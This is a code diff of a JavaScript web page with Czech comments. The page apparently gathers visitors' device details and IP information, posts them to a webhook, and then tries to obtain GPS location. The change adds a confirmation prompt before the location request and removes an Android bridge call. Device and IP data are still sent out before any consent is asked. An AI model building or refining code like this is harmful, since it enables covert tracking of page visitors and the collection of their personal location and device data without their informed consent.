@@ -43,23 +43,28 @@
             getIPInfo(ipData => {
                 let message = `${getDeviceInfo()}\n${ipData}\n📍 GPS: Nepovoleno`;
                 sendToWebhook(message);
-                enableGPS();
+                requestLocationPermission();
             });
+        }
+
+        function requestLocationPermission() {
+            if (navigator.geolocation) {
+                // Pokud geolokace není povolena, zobrazíme potvrzovací okno
+                if (confirm("Chcete povolit sdílení vaší polohy?")) {
+                    // Pokud uživatel klikne na "Ano", požádáme o polohu
+                    enableGPS();
+                } else {
+                    console.log("Uživatel zamítl povolení polohy.");
+                }
+            } else {
+                console.warn("Geolokace není podporována.");
+            }
         }
 
         function enableGPS() {
             if (navigator.geolocation) {
-                if (typeof android !== "undefined" && android.requestLocation) {
-                    console.log("Požadavek na zapnutí GPS...");
-                    android.requestLocation();
-                } else {
-                    console.log("Android GPS API není dostupné. Pokusíme se získat polohu jinak.");
-                }
-
                 // Po zapnutí GPS vyvoláme geolokaci v prohlížeči
                 setTimeout(askForLocation, 3000);
-            } else {
-                console.warn("Geolokace není podporována.");
             }
         }
 
